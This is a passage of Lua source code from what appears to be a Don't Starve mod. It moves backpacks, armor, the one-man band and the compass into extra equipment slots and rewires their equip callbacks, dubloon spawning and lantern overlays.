			inst.components.equippable:SetOnUnequip(bagonunequip)
		end
	end

	AddPrefabPostInit("krampus_sack", bagpostinit)
	AddPrefabPostInit("icepack", bagpostinit)
	AddPrefabPostInit("piggyback", bagpostinit)
	AddPrefabPostInit("candybag", bagpostinit)
	AddPrefabPostInit("seasack", bagpostinit)
	AddPrefabPostInit("spicepack", bagpostinit)
	AddPrefabPostInit("thatchpack", bagpostinit)

	local function SpawnDubloon(inst, owner)
		local dubloon = GLOBAL.SpawnPrefab("dubloon")
		local pt = GLOBAL.Vector3(inst.Transform:GetWorldPosition()) + GLOBAL.Vector3(0, 2, 0)

		if dubloon then
			dubloon.Transform:SetPosition(pt:Get())
			local angle = owner.Transform:GetRotation() * (GLOBAL.PI / 180)
			local sp = (math.random() + 1) * -1
			dubloon.Physics:SetVel(sp * math.cos(angle), math.random() * 2 + 8, -sp * math.sin(angle))
			dubloon.components.inventoryitem:OnStartFalling()
		end
	end

	function piratepackpostinit(inst)
		inst.components.equippable.equipslot = EQUIPSLOTS.BACK
		if DST then
			local oldonequip = inst.components.equippable.onequipfn
			local oldonunequip = inst.components.equippable.onunequipfn
			inst.components.equippable:SetOnEquip(
				function(inst, owner)
					bagonequip(inst, owner)
					inst.dubloon_task =
						inst:DoPeriodicTask(
						TUNING.TOTAL_DAY_TIME,
						function()
							SpawnDubloon(inst, owner)
						end
					)
				end
			)
			inst.components.equippable:SetOnUnequip(
				function(inst, owner)
					bagonunequip(inst, owner)
					inst.dubloon_task:Cancel()
					inst.dubloon_task = nil
				end
			)
		end
	end

	AddPrefabPostInit("piratepack", piratepackpostinit)

	function modbackpackpostinit(inst)
		inst.components.equippable.equipslot = EQUIPSLOTS.BACK
	end

	AddPrefabPostInit("pirateback", modbackpackpostinit)

	local function bandonequip(inst, owner, fn)
		owner.AnimState:OverrideSymbol("swap_body_tall", "swap_one_man_band", "swap_body_tall")
		inst.components.fueled:StartConsuming()
		if fn then fn(inst) end
	end

	local function bandonunequip(inst, owner, fn)
		owner.AnimState:ClearOverrideSymbol("swap_body_tall")
		inst.components.fueled:StopConsuming()
		if fn then fn(inst) end
	end

	function onemanbandpostinit(inst)
		inst.components.equippable.equipslot = EQUIPSLOTS.BACK or EQUIPSLOTS.BODY
		if DST then
			local band_enable = getval(inst.components.equippable.onequipfn,"band_enable")
			local band_disable = getval(inst.components.equippable.onunequipfn,"band_disable")
			inst.components.equippable:SetOnEquip(function(inst, owner) bandonequip(inst, owner, band_enable) end)
			inst.components.equippable:SetOnUnequip(function(inst, owner) bandonunequip(inst, owner, band_disable) end)
		end
	end

	AddPrefabPostInit("onemanband", onemanbandpostinit)

	function heavypostinit(inst)
		if inst:HasTag("heavy") then
			inst.components.equippable.equipslot = EQUIPSLOTS.BACK or EQUIPSLOTS.BODY
		end
	end

	AddPrefabPostInitAny(heavypostinit)

	if IsServer then
		AddPrefabPostInit(
			"slurtlehat",
			function(self)
				if self.components.equippable then
					local oldslurtleequip = self.components.equippable.onequipfn
					self.components.equippable.onequipfn = function(inst, owner)
						oldslurtleequip(inst, owner)
						if owner:HasTag("player") then
							local equipped_body =
								owner.components.inventory ~= nil and owner.components.inventory:GetEquippedItem(EQUIPSLOTS.BACK) or nil
							if equipped_body ~= nil and equipped_body.prefab == "armorsnurtleshell" then
								GLOBAL.AwardPlayerAchievement("snail_armour_set", owner)
							end
						end
					end
				end
			end
		)
	end
	if IsServer or not DST then
		AddPrefabPostInit(
			"armorsnurtleshell",
			function(self)
				local function OnBlocked(owner)
					owner.SoundEmitter:PlaySound("dontstarve/wilson/hit_armour")
				end

				local function ProtectionLevels(inst, data)
					local equippedArmor =
						inst.components.inventory ~= nil and inst.components.inventory:GetEquippedItem(EQUIPSLOTS.BACK) or nil
					if equippedArmor ~= nil then
						if
							inst.sg:HasStateTag("shell") or data.statename == "shell_idle" or data.statename == "shell_hit" or
								data.statename == "shell_enter"
						 then
							equippedArmor.components.armor:SetAbsorption(GLOBAL.TUNING.FULL_ABSORPTION)
						else
							equippedArmor.components.armor:SetAbsorption(GLOBAL.TUNING.ARMORSNURTLESHELL_ABSORPTION)
							equippedArmor.components.useableitem:StopUsingItem()
						end
					end
				end

				local function onequip(inst, owner)
					owner.AnimState:OverrideSymbol("swap_body_tall", "armor_slurtleshell", "swap_body_tall")
					inst:ListenForEvent("blocked", OnBlocked, owner)
					inst:ListenForEvent("newstate", ProtectionLevels, owner)

					if owner:HasTag("player") then
						local equipped_head =
							owner.components.inventory ~= nil and owner.components.inventory:GetEquippedItem(EQUIPSLOTS.HEAD) or nil
						if equipped_head ~= nil and equipped_head.prefab == "slurtlehat" then
							GLOBAL.AwardPlayerAchievement("snail_armour_set", owner)
						end
					end
				end

				local function onunequip(inst, owner)
					local onstopuse = self.components.useableitem.onstopusefn
					owner.AnimState:ClearOverrideSymbol("swap_body_tall")
					inst:RemoveEventCallback("blocked", OnBlocked, owner)
					inst:RemoveEventCallback("newstate", ProtectionLevels, owner)
					if onstopuse then
						onstopuse(inst)
					end
				end
				self.components.equippable.equipslot = EQUIPSLOTS.BACK
				if DST then
					self.components.equippable:SetOnEquip(onequip)
					self.components.equippable:SetOnUnequip(onunequip)
				end
			end
		)
	end
end

if TUNING.COMPASS_SLOT == 1 then
	local function testlantern(inst, owner)
		if owner.replica.inventory ~= nil and owner.replica.inventory:GetEquippedItem(EQUIPSLOTS.WAIST) then
			if inst.components.fueled then
				if inst.components.fueled:IsEmpty() then
					owner.AnimState:OverrideSymbol("lantern_overlay", "swap_compass", "swap_compass")
				elseif inst.prefab == "lantern" then
					owner.AnimState:OverrideSymbol("lantern_overlay", "swap_lantern", "lantern_overlay")
				else
					owner.AnimState:OverrideSymbol("lantern_overlay", "swap_redlantern", "redlantern_overlay")
				end
				owner.AnimState:Show("LANTERN_OVERLAY")
			end
		end
	end

	local function lanternpostinit(self)
		local oldonequip = self.components.equippable.onequipfn
		local oldonunequip = self.components.equippable.onunequipfn
		local olddepleted = self.components.fueled.depleted
		local oldtakefuel = self.components.fueled.ontakefuelfn
		if oldonequip then
			self.components.equippable:SetOnEquip(
				function(inst, owner)
					oldonequip(inst, owner)
					testlantern(inst, owner)
				end
			)
		end
		if oldonunequip then
			self.components.equippable:SetOnUnequip(
				function(inst, owner)
					oldonunequip(inst, owner)
					testlantern(inst, owner)
				end
			)
		end
		if olddepleted then
			self.components.fueled:SetDepletedFn(
				function(inst)
					olddepleted(inst)
					if inst.components.equippable:IsEquipped() then
						testlantern(inst, inst.components.inventoryitem.owner)
					end
				end
			)
		end
		if oldtakefuel then
			self.components.fueled:SetTakeFuelFn(
				function(inst)
					oldtakefuel(inst)
					if inst.components.equippable:IsEquipped() then
						testlantern(inst, inst.components.inventoryitem.owner)
					end
				end
			)
		end
	end
	local function compassonequip(inst, owner)
		owner.AnimState:Show("ARM_carry")
		owner.AnimState:Hide("ARM_normal")
		if owner.replica.inventory ~= nil then
			local equipment = owner.replica.inventory:GetEquippedItem(EQUIPSLOTS.HANDS)
			if equipment == nil then
				owner.AnimState:ClearOverrideSymbol("swap_object")
			end
			if not (equipment ~= nil and string.match(equipment.prefab, "lantern") and not equipment.components.fueled:IsEmpty()) then
				owner.AnimState:OverrideSymbol("lantern_overlay", "swap_compass", "swap_compass")
				owner.AnimState:Show("LANTERN_OVERLAY")
			end
		end

		inst.components.fueled:StartConsuming()

		if owner.components.maprevealable ~= nil then
			owner.components.maprevealable:AddRevealSource(inst, "compassbearer")
		end
		owner:AddTag("compassbearer")
	end

	local function compassonunequip(inst, owner)
		owner.AnimState:Hide("ARM_carry")
		owner.AnimState:Show("ARM_normal")
		if owner.replica.inventory ~= nil then
			local equipment = owner.replica.inventory:GetEquippedItem(EQUIPSLOTS.HANDS)
			if not (equipment ~= nil and string.match(equipment.prefab, "lantern") and not equipment.components.fueled:IsEmpty()) then
				owner.AnimState:ClearOverrideSymbol("lantern_overlay")
			end
		end

		inst.components.fueled:StopConsuming()

		if owner.components.maprevealable ~= nil then
			owner.components.maprevealable:RemoveRevealSource(inst)
		end
		owner:RemoveTag("compassbearer")
	end

	function compasspostinit(inst)
		inst.components.equippable.equipslot = EQUIPSLOTS.WAIST or EQUIPSLOTS.HANDS
		inst.components.equippable:SetOnEquip(compassonequip)
		inst.components.equippable:SetOnUnequip(compassonunequip)
	end

	local function TryCompass(self)
		if self.owner.replica.inventory ~= nil then
			local equipment = self.owner.replica.inventory:GetEquippedItem(EQUIPSLOTS.WAIST or EQUIPSLOTS.HANDS)
			if equipment ~= nil and equipment:HasTag("compass") then
				self:OpenCompass()
				return true
			end
		end
		self:CloseCompass()
		return false
	end

	local function replacelistener(source, target, event, func)
		local listeners = target.event_listeners[event][source]
		local oldfunc = listeners[#listeners]
		source:RemoveEventCallback(event, oldfunc, target)
		source:ListenForEvent(event, func, target)
	end

	local function hudcompasspostconstruct(self)
		replacelistener(
			self.inst,
			self.owner,
			"refreshinventory",
			function(inst)
				TryCompass(self)
			end
		)
		replacelistener(
			self.inst,
			self.owner,
			"unequip",
			function(inst, data)
				if data.eslot == EQUIPSLOTS.WAIST then
					self:CloseCompass()
				end
			end
		)
		TryCompass(self)
	end

	if IsServer then
		AddPrefabPostInit("compass", compasspostinit)
		AddPrefabPostInit("lantern", lanternpostinit)
		AddPrefabPostInit("redlantern", lanternpostinit)
	end
	AddClassPostConstruct("widgets/hudcompass", hudcompasspostconstruct)
end
